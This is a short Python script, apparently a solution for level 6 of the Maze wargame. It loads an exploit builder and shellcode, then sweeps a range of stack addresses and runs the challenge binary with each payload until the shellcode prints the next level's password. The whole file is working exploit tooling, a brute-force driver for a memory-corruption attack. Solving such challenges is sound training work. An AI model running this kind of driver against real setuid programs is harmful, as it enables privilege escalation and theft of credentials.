#!/usr/bin/env python3
"""Maze L6 sweep: sweep buf +-0x1000 step 4 and fire /maze/maze6 per candidate.

The stack address of buf is env-dependent (measured 0xffffd824 under gdb), so
this runs inside the live session's own environment. A hit is visible when the
shellcode's write() produces stdout: the password line printed by the child.
"""
import subprocess, importlib.util

spec = importlib.util.spec_from_file_location("exploit", "/run/screen/l6/exploit.py")
ex = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ex)

sc = open("/run/screen/l6/sc.bin", "rb").read()
path = b"/run/screen/l6/wP.txt"

for delta in range(-0x1000, 0x1001, 4):
    buf = 0xffffd824 + delta
    try:
        pay = ex.build(buf, path, sc)
    except AssertionError:
        continue
    try:
        r = subprocess.run(["/maze/maze6", path, pay], capture_output=True, timeout=5)
    except subprocess.TimeoutExpired:
        continue
    if r.returncode == 0 and r.stdout:
        print("HIT buf", hex(buf))
        print(r.stdout.decode("latin-1"))
        break
else:
    print("none")
